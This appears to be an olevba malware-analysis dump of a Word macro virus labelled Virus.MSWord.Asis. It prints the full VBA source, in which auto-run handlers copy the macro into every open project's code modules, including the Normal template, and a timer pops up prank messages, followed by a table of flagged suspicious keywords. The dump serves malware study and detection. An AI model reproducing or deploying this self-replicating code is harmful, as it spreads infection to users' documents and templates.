olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Asis-4a0ad99ddf2566b80260f03c037a4660711bd3ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Asis-4a0ad99ddf2566b80260f03c037a4660711bd3ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_New()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
 '       .SaveNormalPrompt = False
'        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines > 80 Or .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            '.InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "С 1 Апреля Вас!", "Опа?-Угу!", "А вот и сегодняшний прикол", "Word: Это я буквально только что придумал", "хе-хе", "Word: Это я в Русском радио услышал", "Рекламная служба Microsoft Word", "Word: Задолбали меня эти макровирусы", "Вот Вам," & Application.UserName, "Последний прикол сезона", "Word: Ой, сейчас описаюсь...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, "С 1 Апреля Вас, " & Application.UserName & Space(100) & Assistant.Name, "Опа?-Угу!", "", "", "умру от смеха", "правда смешно", "А вот и сегодняшний прикол", Assistant.Name & ": Это я буквально только что придумал", Assistant.Name & ": Ой, сейчас описаюсь...", "хе-хе", Assistant.Name & ": Это я в Русском радио услышал", "Рекламная служба Microsoft Word", Assistant.Name & ": Задолбали меня эти макровирусы", "Вот Вам," & Application.UserName, "Последний прикол сезона")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

